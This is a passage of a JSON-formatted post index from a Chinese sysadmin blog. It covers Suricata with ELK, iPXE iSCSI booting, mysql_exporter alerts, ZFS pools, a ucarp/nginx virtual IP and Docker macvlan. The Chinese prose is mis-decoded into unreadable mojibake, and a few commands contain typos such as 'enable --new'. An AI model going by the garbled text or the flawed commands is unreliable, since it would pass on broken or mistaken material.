ä¸€ç›®äº†ç„¶ï¼Œ6504æ˜¯å°Win7çš„è™šæœºï¼Œç¥¸å®³å•Šã€‚\n","date":"2023-12-15","img":"","permalink":"https://rendoumi.com/posts/20231215-swap_usage/","series":null,"tags":null,"title":"æŸ¥çœ‹SWAPäº¤æ¢ç©ºé—´è¢«å“ªä¸ªè¿›ç¨‹ç»™ç”¨æ‰äº†"},{"categories":null,"content":"Linuxä¸‹å¤šçº¿ç¨‹ä¸‹è½½å·¥å…·ï¼Œä¸”æ”¯æŒæ–­ç‚¹ç»­ä¼ ï¼Œæœºæˆ¿ä¼ æ–‡ä»¶å¿…å¤‡ï¼š\n1axel -s 9000000 -a -n 5 -o ord_his.dmp http://172.16.24.2:8080/ord_his.dmp -s é™é€Ÿï¼Œ9000000æ˜¯70Må¸¦å®½ï¼Œä¸åŠ så°±æ˜¯100Mæ¦¨å¹² -n çº¿ç¨‹ï¼Œç¼ºçœæ˜¯4 -o ç›®çš„æ–‡ä»¶ -a è¿›åº¦æ¡å‹ç¼©å±•ç¤ºï¼Œå¿…é¡»åŠ ï¼Œå¦åˆ™ä¼šè¿›åº¦æ»¡å¤©é£\næ³¨æ„ï¼šaxel æ˜¯å¯ä»¥è‡ªåŠ¨æ–­ç‚¹ç»­ä¼ çš„\n","date":"2023-12-15","img":"","permalink":"https://rendoumi.com/posts/20231215-axel_download/","series":null,"tags":null,"title":"Linuxæ”¯æŒæ–­ç‚¹ç»­ä¼ ã€å¤šçº¿ç¨‹ä¸‹è½½çš„è½¯ä»¶"},{"categories":null,"content":"suricata æ˜¯è·Ÿsnortå·®ä¸å¤šçš„ä¸€ä¸ªå…¥ä¾µæ£€æµ‹å·¥å…·ï¼ŒåŠ ä¸Šelkçš„å›¾å½¢ç•Œé¢ï¼Œéå¸¸çš„å¥½çœ‹ã€‚\nåŸç†æ˜¯suricataçš„logå‘åˆ°elké‡Œï¼Œè¿™æ ·å°±èƒ½é€šè¿‡kibanaè¿›è¡Œåˆ†æäº†\nç¯å¢ƒï¼š\n1ã€ç‰©ç†æœºéœ€è¦å¼€16Gå†…å­˜ï¼Œ16CPUï¼Œéƒ½ä¸å¤ªå¤Ÿ 2ã€ç‰©ç†æœº172.18.30.2çš„br3æ˜¯äº¤æ¢æœºçš„Mirrorå£ï¼Œè¿›å…¥çš„å…¨éƒ¨æµé‡éƒ½è¢«é•œåƒäº†ä¸€ä»½ 3ã€suricata-18-31-31æ˜¯è™šæœºï¼Œéœ€è¦å°†30.2çš„br3æŒ‚è¿›æ¥\n1virsh attach-interface --domain suricata-18-31-31 --type bridge --source br3 --model e1000 --config --live 2åŒæ—¶åœ¨31.31é‡Œï¼Œifconfig up eth1æŠŠç½‘å¡èµ·èµ·æ¥ 3tcpdump -i eth1æœ‰æ•°æ®å³å¯ 4ã€é¦–å…ˆå®‰è£…java\n1rpm -ivh jdk-8u201-linux-x64.rpm å®‰è£…ï¼š ä¸€ã€ç¼–è¯‘å®‰è£…suricata\n1yum -y install epel-release 2 3yum -y install jq cargo openssl-devel PyYAML lz4-devel gcc libpcap-devel pcre-devel libyaml-devel file-devel zlib-devel jansson-devel nss-devel libcap-ng-devel libnet-devel tar make libnetfilter_queue-devel lua-devel GeoIP-devel 4 5wget https://www.openinfosecfoundation.org/download/suricata-4.1.8.tar.gz 6tar zxvf suricata-4.1.8.tar.gz 7cd suricata 8./configure --libdir=/usr/lib64 --prefix=/usr --sysconfdir=/etc --localstatedir=/var --enable-nfqueue --enable-lua --enable-geoip --enable-profiling 9make 10make install-full 11 12éªŒè¯ä¸€ä¸‹ 13suricata -V 14This is Suricata version 4.1.8 RELEASE 15 16æŸ¥çœ‹buildå‚æ•° 17suricata --build-info suricataå°±è£…å¥½äº†ï¼Œè¿˜éœ€è¦é…ä¸€ä¸‹suricata-updateï¼Œè§„åˆ™æ‰æ˜¯æœ€ä¸»è¦çš„ï¼Œè£…å¥½åæœ€å¥½æ¯å¤©æ›´æ–°ä¸€ä¸‹è§„åˆ™\n1suricata-update update-sources 2suricata-update list-sources 3 4suricata-update enable-source ptresearch/attackdetection 5suricata-update enable-source oisf/trafficid 6suricata-update enable-source sslbl/ssl-fp-blacklist 7 8suricata-update suricata-updateçš„ç”¨æ³•\n1suricata-update list-enabled-sources 2suricata-update disable-source et/pro 3suricata-update remove-source et/pro æµ‹è¯•è§„åˆ™ï¼š\n1suricata -T /etc/suricata/suricata.yamlçš„ä¿®æ”¹éƒ¨åˆ†\n1HOME_NET: \u0026#34;[43.231.149.0/25]\u0026#34; 2outputsè¢«æ”¹è¿‡ 3outputs: 4app-layerè¢«æ”¹è¿‡ 5app-layer: å…·ä½“çœ‹é™„ä»¶ä¸­çš„suricata.yaml\nå¯åŠ¨ï¼š\n1/usr/bin/suricata -c /etc/suricata/suricata.yaml -i eth1 -D äºŒã€ç¼–è¯‘å®‰è£…ELK\n1rpm --import https://artifacts.elastic.co/GPG-KEY-elasticsearch 2 3cat \u0026lt;\u0026lt;EOF | sudo tee /etc/yum.repos.d/elasticsearch.repo 4[elasticsearch-7.x] 5name=Elasticsearch repository for 7.x packages 6baseurl=https://artifacts.elastic.co/packages/7.x/yum 7gpgcheck=1 8gpgkey=https://artifacts.elastic.co/GPG-KEY-elasticsearch 9enabled=1 10autorefresh=1 11type=rpm-md 12EOF 13 14yum clean all 15yum makecache 16 17yum install -y elasticsearch logstash kibana filebeat å®‰è£…çš„æ—¶å€™æœ€å¥½è®¾ä¸€ä¸‹ç¿»å¢™ï¼Œå¦åˆ™ä¸‹è¿™å‡ ä¸ªåŒ…éå¸¸æ…¢ï¼ï¼ï¼\nç„¶åä¸€ä¸ªä¸€ä¸ªæ¥è®¾ç½®\n11ã€è®¾ç½®elasticsearch 2vi /etc/elasticsearch/jvm.options 3-Xms4g 4-Xmx4g 5vi /etc/elasticsearch/elasticsearch.yml 6indices.query.bool.max_clause_count: 8192 7search.max_buckets: 250000 8 9systemctl enable --now elasticsearch 10 112ã€è®¾ç½®logstash 12å°†é™„ä»¶ä¸­logstashç›®å½•ä¸‹çš„synlite_suricata/ç›®å½•å®Œæ•´æŒªåˆ°/etc/logstashä¸‹ 13/etc/logstash/synlite_suricata/ 14 15å°†é™„ä»¶ä¸­logstashç›®å½•ä¸‹çš„pipelines.ymlæ‹·è´åˆ°/etc/logstashä¸‹ 16/etc/logstash/pipelines.yml 17 18å°†é™„ä»¶ä¸­logstashç›®å½•ä¸‹çš„logstash.serviceæ‹·è´è¦†ç›–æ‰/etc/systemd/system/logstast.service 19/etc/systemd/system/logstash.service 20 21vi /etc/logstash/jvm.options 22-Xms4g 23-Xmx4g 24 25systemctl daemon-reload 26systemctl enable --now logstash 27 283ã€è®¾ç½®filebeat 29vi /etc/filebeat/filebeat.yml 30filebeat.inputs: 31- type: log 32 enabled: true 33 paths: 34 - /var/log/suricata/eve.json 35 fields: 36 event.type: suricata 37 38output.logstash: 39 hosts: [\u0026#34;127.0.0.1:5044\u0026#34;] 40 #ssl.certificate_authorities: [\u0026#34;/etc/pki/root/ca.pem\u0026#34;] 41 #ssl.certificate: \u0026#34;/etc/pki/client/cert.pem\u0026#34; 42 #ssl.key: \u0026#34;/etc/pki/client/cert.key\u0026#34; 43 44systemctl enable --now logstash 45 464ã€è®¾ç½®kibana 47vi /etc/kibana/kibana.yml 48server.host: \u0026#34;172.18.31.31\u0026#34; 49 50systemctl enable --new kibana è·‘èµ·æ¥ä»¥åæ‰“å¼€ http://172.18.31.31:5601 å°±å¯ä»¥çœ‹åˆ°äº†\nå¦‚æœä¸å‡ºæ„å¤–ï¼Œåº”è¯¥æœ‰æ•°æ®äº†ã€‚éœ€è¦å»ºç«‹ä¸€ä¸ªsuricata*çš„ç´¢å¼•ã€‚\nå»kibanaçš„home \u0026ndash;\u0026gt; Stack Management\nå¯¼å…¥çš„synlite_suricata.kibana.7.1.x.json\nhttps://github.com/robcowart/synesis_lite_suricata/blob/master/kibana/synlite_suricata.kibana.7.1.x.json ç„¶ååœ¨dashboardé‡Œå°±å¯ä»¥çœ‹åˆ°äº†\nå¯ä»¥æ¸…æ¥šçš„çœ‹åˆ°å„ç§ipflowï¼Œæµé‡åˆ†å¸ƒã€‚\n","date":"2023-12-15","img":"","permalink":"https://rendoumi.com/posts/20231215-suricata_elk/","series":null,"tags":null,"title":"SuricataåŠ ä¸Šelkåˆ†ææœºæˆ¿å…¥å£å…¨æµé‡"},{"categories":null,"content":"å¦‚æœä¸€å°å®¿ä¸»æœºä¸Šé¢cpuå’Œmemoryéƒ½æœ‰å¯Œè£•ï¼Œä½†æ˜¯ç£ç›˜ä¸å¯Œè£•ï¼Œé‚£å°±ä¼šé¢ä¸´èµ„æºæµªè´¹\næ‰€ä»¥å¹²è„†ç”¨ipxeçš„sanbootæ¥å¯åŠ¨è¿œç¨‹çš„iscsiç£ç›˜æ¥å¯åŠ¨è™šæœºå¥½äº†\né¦–å…ˆç”¨ã€Šiscsiå·çš„è¿œç¨‹æŒ‚è½½ ã€‹è¿™ç¯‡æ–‡ç« ä¸­æ‰€è¯´çš„æ–¹æ³•ï¼Œåœ¨172.18.30.18çš„20Tçš„loopback vg groupä¸Šï¼Œåˆ’å‡ºä¸€å—80Gçš„ç¡¬ç›˜\n1#åˆ’ä¸ªlvcï¼Œç”¨çš„æ˜¯vg-targetdçš„20Tä¸­çš„80G 2lvcreate -L 80G -n pvc-vis-18-31-48 vg-targetd 3 4#å»ºç«‹blockå—è®¾å¤‡ 5targetcli /backstores/block create vg-targetd:pvc-vis-18-31-48 /dev/vg-targetd/pvc-vis-18-31-48 6 7#å»ºç«‹30.18ä¸Šçš„iscsiæœåŠ¡ç«¯ï¼Œä¼¼ä¹ç”¨renhe-18-30-18æ¯”è¾ƒå¥½ï¼Œä½†æ˜¯ä¸å¥½åŒºåˆ†å¤šä¸ªå·ï¼Œè¿˜æ˜¯ç”¨ä¸‹é¢çš„ç²¾å‡† 8targetcli /iscsi create iqn.2020-10.com.ddky:vis-18-31-48 9 10#å»ºç«‹lunsï¼Œä¼šè‡ªåŠ¨å»ºç«‹portal 11targetcli /iscsi/iqn.2020-10.com.ddky:vis-18-31-48/tpg1/luns create /backstores/block/vg-targetd:pvc-vis-18-31-48 12 13#å»ºç«‹å®¢æˆ·ç«¯çš„iscsiï¼Œä¸åŠ ä»»ä½•è®¤è¯ 14targetcli /iscsi/iqn.2020-10.com.ddky:vis-18-31-48/tpg1/acls create iqn.2020-10.com.ddky:vis-18-31-48 è®°ä¸‹æ¥è¿™ä¸ª: iqn.2020-10.com.ddky:vis-18-31-48\nç„¶åä¿®æ”¹pxeï¼Œä½äº172.18.31.2 /export/html/pxeboot/boot2.phpï¼Œæœ¬è´¨æ˜¯å‘é€ipxeçš„å‘½ä»¤\nsanhookæ˜¯åŠ è½½è¿œç¨‹ç¡¬ç›˜ï¼Œå¹¶è®¾ç½®ä¸º/dev/sda\n1function sansetup() { 2 global $hostname; 3 echo \u0026#34;:sansetup\\n\u0026#34;; 4 echo \u0026#34;set initiator-iqn iqn.2020-10.com.ddky:vis-18-31-48\\n\u0026#34;; 5 echo \u0026#34;set keep-san 1\\n\u0026#34;; 6 echo \u0026#34;sanhook iscsi:172.18.30.18::::iqn.2020-10.com.ddky:vis-18-31-48\\n\u0026#34;; 7 echo \u0026#34;kernel $hostname/repos/centos/7/os/x86_64/images/pxeboot/vmlinuz\\n\u0026#34;; 8 echo \u0026#34;initrd $hostname/repos/centos/7/os/x86_64/images/pxeboot/initrd.img\\n\u0026#34;; 9 echo \u0026#34;imgargs vmlinuz load_ramdisk=1 ks=$hostname/pxeboot/install/centos/centos7_last.php ksdevice=eth0 net.ifnames=0 biosdevname=0\\n\u0026#34;; 10 echo \u0026#34;boot\\n\u0026#34;; 11} å‘åŠ¨ä¸€ä¸ªæ— ç›˜çš„è™šæœºä»pxeå¯åŠ¨ï¼ˆ172.18.30.3 /export/kvm/48.shï¼‰ï¼š\n1#!/bin/bash 2 virt-install \\ 3 --name=pxe-18-31-48 \\ 4 --vcpu=4 \\ 5 --ram=4096 \\ 6 --pxe \\ 7 --disk none \\ 8 --os-type=linux \\ 9 --network bridge=br0.199 \\ 10 --vnc --vnclisten=0.0.0.0 --vncport=5910 æ³¨æ„ä¸Šé¢ï¼šæŒ‡å®šäº†pxe å’Œdisk noneï¼Œè¿™æ ·å°±ä¼šå¯åŠ¨èµ·æ¥å¹¶å®‰è£…åˆ°è¿œç¨‹çš„iscsiç›˜ä¸Šå»\nå®‰è£…å®Œæˆåï¼Œä¿®æ”¹ipxeæŒ‡å®šè¯¥è™šæœºæœºä»sanbootå¯åŠ¨ï¼Œè¿™æ—¶å€™iscsiå·é‡Œå·²ç»æœ‰å¼•å¯¼ä¿¡æ¯äº†ï¼Œå°±éœ€è¦å»æ‰æŒ‡å®šã€‚\n1function sanboot() { 2 global $hostname; 3 echo \u0026#34;:sanboot\\n\u0026#34;; 4 echo \u0026#34;set initiator-iqn iqn.2020-10.com.ddky:vis-18-31-48\\n\u0026#34;; 5 echo \u0026#34;set keep-san 1\\n\u0026#34;; 6 echo \u0026#34;sanboot iscsi:172.18.30.18::::iqn.2020-10.com.ddky:vis-18-31-48\\n\u0026#34;; 7 echo \u0026#34;boot\\n\u0026#34;; 8} é‡å¯åè¯¥æœºå™¨å°±ä¼šä»iscsiå¯åŠ¨äº†ã€‚\n","date":"2023-12-15","img":"","permalink":"https://rendoumi.com/posts/20231215-pxe_sanboot/","series":null,"tags":null,"title":"Ipxeä½¿ç”¨sanbootè¿œç¨‹å¯åŠ¨iscsiç¡¬ç›˜"},{"categories":null,"content":"mysql_exporter å…¶å®æ˜¯ä¸€ä¸ªmysqlå®¢æˆ·ç«¯ï¼Œå®šæ—¶æ”¶é›†æœ¬æœºmysqlçš„æ•°æ®ï¼Œå¹¶æš´éœ²å‡ºä¸€ä¸ªwebç«¯å£å±•ç°æ•°æ®ã€‚\nä¾‹å¦‚ï¼šhttp://172.18.20.9:50001/metrics ï¼Œè¿™é‡Œæˆ‘ä»¬æš´éœ²çš„ç«¯å£æ˜¯50001ã€‚\nprometheus æ¯éš”5åˆ†é’Ÿä¼šè®¿é—®è¿™ä¸ªwebé¡µé¢ï¼ŒæŠŠä¸Šé¢çš„æ•°æ®æŠ“ä¸‹æ¥å…¥åº“ã€‚ï¼ˆæ—¶é—´é—´éš”å¯ä»¥è°ƒæ•´ï¼‰\næˆ‘ä»¬ç‚¹è¿›Prometheusçš„é¡µé¢ï¼š\næ³¨æ„å³ä¸‹è§’çš„æ—¶é—´æˆ³æ˜¯ä¸å¯¹çš„ï¼Œå·®8å°æ—¶ï¼Œæˆ‘ä»¬ç‚¹å³ä¸Šè§’çš„React UI è¿™ä¸ªUIæ—¶é—´æ˜¯å¯¹çš„ï¼Œè·Ÿå½“åœ°æ—¶é—´ä¸€è‡´ï¼š æƒ³çœ‹ mysql çš„æŒ‡æ ‡ï¼Œå°±éœ€è¦ç¼–è¾‘å…¬å¼ï¼Œè¾“å…¥mysqlä¼šæ˜¾ç¤ºæ‰€æœ‰mysqlçš„å…¬å¼ï¼š æ³¨æ„ï¼šæˆ‘ä»¬ mysql_exporter çš„ç«¯å£æ˜¯50001 ï¼Œ å†™ promsql é€‰æ‹©instanceçš„æ—¶å€™æ˜¯è¿™æ ·çš„instance=\u0026ldquo;172.18.20.9:50001\u0026rdquo;\nç»™ä¸€äº›æŠ¥è­¦ä¾‹å­ï¼š\n1rate(mysql_global_status_threads_connected[5m]) \u0026gt; 200 2 3mysql_global_variables_max_connections - mysql_global_status_threads_connected \u0026lt; 500 4 5mysql_global_status_innodb_num_open_files \u0026gt; (mysql_global_variables_open_files_limit) * 0.75 ","date":"2023-12-15","img":"","permalink":"https://rendoumi.com/posts/20231215-prometheus_mysql/","series":null,"tags":null,"title":"Prometheusé›†æˆè¿›mysql_exporter"},{"categories":null,"content":"zfsç”¨æ¥é¡¶æ›¿Raidæ§åˆ¶å¡ï¼Œæœ‰ç›¸å½“å¼ºæ‚çš„æ€§èƒ½ï¼ŒTrueNASç”¨çš„å°±æ˜¯è¿™ç©æ„ã€‚\nå®˜æ–¹å®‰è£…æ–‡æ¡£ï¼š https://openzfs.github.io/openzfs-docs/Getting%20Started/RHEL%20and%20CentOS.html CentOS7å®‰è£…\n1yum install -y epel-release 2yum install -y https://zfsonlinux.org/epel/zfs-release.el7_9.noarch.rpm 3yum install -y kernel-devel zfs åŠ è½½æ¨¡å—\n1[root@localhost ~]# lsmod|grep zfs 2 3[root@localhost ~]# modprobe zfs 4 5[root@localhost ~]# lsmod|grep zfs 6zfs 3986850 0 7zunicode 331170 1 zfs 8zlua 151525 1 zfs 9zcommon 89551 1 zfs 10znvpair 94388 2 zfs,zcommon 11zavl 15167 1 zfs 12icp 301854 1 zfs 13spl 104299 5 icp,zfs,zavl,zcommon,znvpair çœ‹çœ‹æ–‡ä»¶ç³»ç»Ÿ\n1[root@localhost ~]# zfs list 2no datasets available 192.168.85.100çš„æœ¬åœ°ç£ç›˜ä»sdb ä¸€ç›´åˆ° sdgï¼Œé¦–å…ˆzpoolå»ºç«‹æ± å­ï¼Œç±»ä¼¼raidå¡çš„åŠŸèƒ½ ç„¶åå†zfså»ºç«‹æ–‡ä»¶ç³»ç»Ÿ\n1[root@localhost ~]# zpool create -f zfspool sdb sdc sdd sde sdf sdg 2 3[root@localhost ~]# zpool status 4 pool: zfspool 5 state: ONLINE 6 scan: none requested 7config: 8 9 NAME STATE READ WRITE CKSUM 10 zfspool ONLINE 0 0 0 11 sdb ONLINE 0 0 0 12 sdc ONLINE 0 0 0 13 sdd ONLINE 0 0 0 14 sde ONLINE 0 0 0 15 sdf ONLINE 0 0 0 16 sdg ONLINE 0 0 0 17 18errors: No known data errors 19 20[root@localhost ~]# df -h 21æ–‡ä»¶ç³»ç»Ÿ å®¹é‡ å·²ç”¨ å¯ç”¨ å·²ç”¨% æŒ‚è½½ç‚¹ 22devtmpfs 63G 0 63G 0% /dev 23tmpfs 63G 0 63G 0% /dev/shm 24tmpfs 63G 9.9M 63G 1% /run 25tmpfs 63G 0 63G 0% /sys/fs/cgroup 26/dev/mapper/centos-root 50G 1.7G 49G 4% / 27/dev/sda1 1014M 189M 826M 19% /boot 28/dev/mapper/centos-home 392G 33M 392G 1% /home 29tmpfs 13G 0 13G 0% /run/user/0 30zfspool 53T 128K 53T 1% /zfspool ä¸Šé¢å¯¹ç”Ÿäº§æ— æ„ä¹‰ï¼Œæ²¡æœ‰ä»»ä½•å†—ä½™çš„é…ç½®åœ¨ç”Ÿäº§æ˜¯è¡Œä¸é€šçš„\nç ´åæ‰å…ˆ\n1zpool destroy zfspool æ¡å¸¦å¯¹æœºæˆ¿åŸºæœ¬æ— æ„ä¹‰ï¼Œåšmirror 1å³Raid1\n1[root@localhost ~]# zpool create -f zfspool mirror sdb sdc 2 3[root@localhost ~]# zpool status 4 pool: zfspool 5 state: ONLINE 6 scan: none requested 7config: 8 9 NAME STATE READ WRITE CKSUM 10 zfspool ONLINE 0 0 0 11 mirror-0 ONLINE 0 0 0 12 sdb ONLINE 0 0 0 13 sdc ONLINE 0 0 0 14 15errors: No known data errors mirrorçš„è¯å¾€é‡Œé¢å¢åŠ ç›˜å¿…é¡»æˆå¯¹ï¼Œå•ç›˜ç¦æ­¢å¾€é‡Œé¢åŠ \n1[root@localhost ~]# zpool add -f zfspool mirror sde 2invalid vdev specification: mirror requires at least 2 devices å¢åŠ ä¸€å¯¹ç›˜è¿›å»ï¼Œè¿™æ ·å°±åšæˆRaid10äº†\n1[root@localhost ~]# zpool add -f zfspool mirror sde sdf 2 3[root@localhost ~]# zpool status 4 pool: zfspool 5 state: ONLINE 6 scan: none requested 7config: 8 9 NAME STATE READ WRITE CKSUM 10 zfspool ONLINE 0 0 0 11 mirror-0 ONLINE 0 0 0 12 sdb ONLINE 0 0 0 13 sdc ONLINE 0 0 0 14 mirror-1 ONLINE 0 0 0 15 sde ONLINE 0 0 0 16 sdf ONLINE 0 0 0 17 18errors: No known data errors å¦å¤–zfsæœ‰ä¸ªç‰¹æ®Šçš„raidz1 raidz2 raidz3 åˆ†åˆ«ä»£è¡¨å…è®¸1å—ç›˜åï¼Œ2å—ç›˜åï¼Œ3å—ç›˜å éœ€è¦çš„ç›˜æœ€å°æ•°é‡åˆ†åˆ«æ˜¯2å—ï¼Œ3å—ï¼Œ4å—\nåœ¨ç”Ÿäº§ï¼Œæ¯”è¾ƒé€‚åˆçš„æ˜¯å…è®¸2å—ç›˜åï¼Œå¹¶åŠ 1å—host spare\n1[root@localhost /]# zpool create -f zfspool raidz2 sdb sdc sde sdf 2 3[root@localhost /]# zpool status 4 pool: zfspool 5 state: ONLINE 6 scan: none requested 7config: 8 9 NAME STATE READ WRITE CKSUM 10 zfspool ONLINE 0 0 0 11 raidz2-0 ONLINE 0 0 0 12 sdb ONLINE 0 0 0 13 sdc ONLINE 0 0 0 14 sde ONLINE 0 0 0 15 sdf ONLINE 0 0 0 16 17errors: No known data errors å¢åŠ çƒ­å¤‡ç›˜spare\n1[root@localhost /]# zpool add zfspool spare sdg 2 3[root@localhost /]# zpool status 4 pool: zfspool 5 state: ONLINE 6 scan: none requested 7config: 8 9 NAME STATE READ WRITE CKSUM 10 zfspool ONLINE 0 0 0 11 raidz2-0 ONLINE 0 0 0 12 sdb ONLINE 0 0 0 13 sdc ONLINE 0 0 0 14 sde ONLINE 0 0 0 15 sdf ONLINE 0 0 0 16 spares 17 sdg AVAIL 18 19errors: No known data errors å¦‚æœå‡ºç°åç›˜ï¼Œç”¨å¥½ç›˜sdfæ¢æ‰åç›˜sde\n1[root@localhost /]# zpool replace zfspool sde sdf 2 3[root@localhost /]# zpool status 4 pool: zfspool 5 state: ONLINE 6 scan: resilvered 1.17M in 0 days 00:00:00 with 0 errors on Thu Mar 11 20:02:19 2021 7config: 8 9 NAME STATE READ WRITE CKSUM 10 zfspool ONLINE 0 0 0 11 raidz2-0 ONLINE 0 0 0 12 sdb ONLINE 0 0 0 13 sdc ONLINE 0 0 0 14 sdf ONLINE 0 0 0 15 spares 16 sdg AVAIL 17 18errors: No known data errors æ£€æŸ¥zpoolç£ç›˜ç»„çš„å®Œæ•´æ€§\n1zpool scrub testpool å¢åŠ cacheä¼šå¢åŠ è¯»é€Ÿåº¦ï¼Œç±»ä¼¼ç›˜é˜µçƒ­ç‚¹SSDè‡ªåŠ¨è½ç›˜æŠ€æœ¯\n1$ zpool create mirror /dev/sda /dev/sdb cache /dev/sdk /dev/sdl å¢åŠ logä¼šæé«˜å†™é€Ÿåº¦ï¼Œç±»ä¼¼ç›˜é˜µçƒ­ç‚¹SSDè‡ªåŠ¨è½ç›˜æŠ€æœ¯\n1$ zpool create mirror /dev/sda /dev/sdb log /dev/sdk /dev/sdl zpool å»ºç«‹å¥½zfspoolåï¼Œå¯ä»¥å»ºæ–‡ä»¶ç³»ç»Ÿ\n1zfs create zfspool/dba-vol 2 3[root@localhost /]# zfs list 4NAME USED AVAIL REFER MOUNTPOINT 5zfspool 1.47M 35.2T 153K /zfspool 6zfspool/dba-vol 262K 35.2T 160K /zfspool/dba-vol ä¿®æ”¹æŒ‚è½½ç‚¹\n1zfs set mountpoint=/path/to/mount zpool-name/dataset-name å¿«ç…§\n1zfs snapshot [pool]/[dataset name]@[snapshot name] 2zfs snapshot zfspool/dba-vol@dba-vol-20210315 3 4zfs list -t snapshot 5 6æ³¨æ„ï¼Œå¿«ç…§æ¢å¤åï¼Œè¯¥æ—¶é—´ç‚¹ä¹‹åçš„å¿«ç…§ä¼šå…¨éƒ¨ä¸¢å¤± 7zfs rollback -r [pool]/[dataset]@[snapshot name] 8zfs rollback -r zfspool/dba-vol@dba-vol-20210315 ","date":"2023-12-15","img":"","permalink":"https://rendoumi.com/posts/20231215-zfs_centos/","series":null,"tags":null,"title":"CentOS7å®‰è£…ZFS"},{"categories":null,"content":"ucarpæˆ‘ä»¬æ¥å®æˆ˜ä¸€ä¸‹å®Œæˆucarp+nginxåšå†…ç½‘vipï¼Œæ¨¡æ‹ŸF5çš„vipçš„æ–¹æ³•\nucarpçš„å®‰è£…å‚è€ƒä¹‹å‰çš„æ–‡ç« ï¼Œç¯å¢ƒå¦‚ä¸‹ï¼š\nucarp1ï¼š192.168.19.1 ucarp2ï¼š192.168.19.2 vipï¼š172.18.19.10 åœ¨172.18.19.1å’Œ172.18.19.2ä¸Šç¼–è¯‘Nginx 1.16.1\n1 ./configure --prefix=/export/servers/nginx1161 --with-stream --with-stream_ssl_module 2\tmake 3\tmake install é‡ç‚¹æ˜¯/export/servers/nginx1161/conf/nginx.conf\n1cat /export/servers/nginx1161/conf/nginx.conf 2 3 user nobody; 4 worker_processes auto; 5 6 events { 7 use epoll; 8 worker_connections 65535; 9 } 10 11 stream { 12 log_format proxy \u0026#39;$remote_addr [$time_local] \u0026#39; 13 \u0026#39;$protocol $status $bytes_sent $bytes_received \u0026#39; 14 \u0026#39;$session_time \u0026#34;$upstream_addr\u0026#34; \u0026#39; 15 \u0026#39;\u0026#34;$upstream_bytes_sent\u0026#34; \u0026#34;$upstream_bytes_received\u0026#34; \u0026#34;$upstream_connect_time\u0026#34;\u0026#39;; 16 } 17 18 access_log logs/tcp-access.log proxy ; 19 open_log_file_cache off; 20 21 upstream stream_backend01 { 22 hash $remote_addr consistent; 23 #server 172.18.31.2:80 weight=5; 24 server 172.18.31.2:80 max_fails=2 fail_timeout=30s; 25 #server 172.18.31.2:80 max_conns=3; 26 } 27 28 server { 29 listen 172.18.19.10:80; 30 proxy_timeout 20s; 31 proxy_pass stream_backend01; 32 } 33 34} æ³¨æ„ï¼š 1ã€æ‰“å‡ºäº†tcp-access.log 2ã€æ ¹æ®æºIPåšhashï¼Œå¼ºåˆ¶åˆ†é…åˆ°åé¢çš„åŒä¸€å°æœåŠ¡å™¨ä¸Šï¼Œä¿è¯ä¸€è‡´æ€§ 3ã€åç«¯çš„serverå¯ä»¥æœ‰æƒé‡ï¼Œæœ€å¤§è¿æ¥ï¼Œä»¥åŠå¤±æ•ˆæ£€æµ‹ï¼ˆ30så†…æ— æ³•è¿é€š2æ¬¡ï¼Œå°±æ‘˜æ‰è¿™ä¸ªæœåŠ¡å™¨ï¼‰\nåŒæ—¶è°ƒæ•´vip-up.sh\n1cat /usr/local/bin/vip-up.sh 2 3#!/bin/sh 4/sbin/ip addr add ${2}/24 dev ${1} 5/sbin/ip neigh flush dev ${1} 6/export/servers/nginx/sbin/nginx 7/export/servers/nginx/sbin/nginx -s reload è°è·å¾—äº†ä¸»ip 172.18.19.10ï¼Œè°å°±ä¼šå¯åŠ¨nginxï¼Œå¹¶ä¸”å¼ºåˆ¶åˆ·ä¸€ä¸‹é…ç½®\næ³¨æ„ï¼Œä¸€å¼€å§‹çš„æ—¶å€™ï¼Œç”±äº172.18.19.2æ²¡æœ‰è·å¾—ä¸»ip 172.18.19.10ï¼Œæ‰€ä»¥ä¸Šé¢æ˜¯ä¸ä¼šè‡ªåŠ¨èµ·nginxè¿›ç¨‹çš„ï¼ï¼ï¼\næµ‹è¯•ä¸€ä¸‹ï¼š\n1åœ¨172.18.19.1ä¸Šé¢ 2kill -usr2 ucarpçš„è¿›ç¨‹pid 3 4çœ‹172.18.19.2ä¸Šé¢ï¼Œnginxå·²ç»è‡ªåŠ¨å¯åŠ¨äº† 5ç„¶åè®¿é—® 6curl http://172.18.19.10/ ok\n","date":"2023-12-14","img":"","permalink":"https://rendoumi.com/posts/20231214-ucarp_nginx/","series":null,"tags":null,"title":"Ucarpå’Œnginxæä¾›å†…ç½‘vip"},{"categories":null,"content":"åœ¨k8sæ²¡æœ‰å‡ºæ¥ä¹‹å‰ï¼Œæˆ‘ä»¬ç”¨çš„å°±æ˜¯LXCï¼Œå¤æ—©ç‰ˆæœ¬äº†ã€‚\nè·‘çš„LXCï¼ŒåŸºäºdockerè¿›è¡Œç®¡ç†ï¼Œç½‘ç»œéƒ¨åˆ†ç‹¬ç«‹ã€‚\nè¿›åŒ–åˆ°æ–°ç‰ˆæœ¬çš„Dockeråï¼Œç½‘ç»œéƒ¨åˆ†éœ€è¦ä¿®æ”¹ï¼Œæˆ‘ä»¬å†³å®šé‡‡ç”¨macvlanæ–¹å¼æ‰å¹³ç›´æ¥æ¥å…¥æœ¬åœ°ç½‘ç»œï¼š\nDockerè£…å¥½ä»¥åï¼Œç³»ç»Ÿä¸­ä¼šå‡ºç°ä¸€ä¸ªDocker0çš„ç½‘ç»œï¼Œç”¨æ¥NATï¼Œæˆ‘ä»¬ä¸ç”¨è¿™ä¸ª\n12: eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000 2 link/ether 52:54:00:14:ee:63 brd ff:ff:ff:ff:ff:ff 3 inet 172.18.31.33/24 brd 172.18.31.255 scope global eth0 4 valid_lft forever preferred_lft forever 53: docker0: \u0026lt;NO-CARRIER,BROADCAST,MULTICAST,UP\u0026gt; mtu 1500 qdisc noqueue state DOWN group default 6 link/ether 02:42:ef:af:de:98 brd ff:ff:ff:ff:ff:ff 7 inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0 8 valid_lft forever preferred_lft forever æˆ‘ä»¬è¦åšçš„æ˜¯å¯¹eth0åšmacvlanï¼Œä¸åšä»»ä½•iptableï¼Œç›´æ¥æ¥å…¥æœ¬åœ°ç½‘ç»œ\nå®¿ä¸»æœºip: 172.18.31.33 Docker1: 172.18.31.35\nä¸€ã€å»ºmacvlan\n1docker network create -d macvlan \\ 2 --subnet=172.18.31.0/24 --gateway=172.18.31.254 \\ 3 -o parent=eth0 \\ 4 macvlan0 5 6docker network ls 7 8docker inspect macvlan0 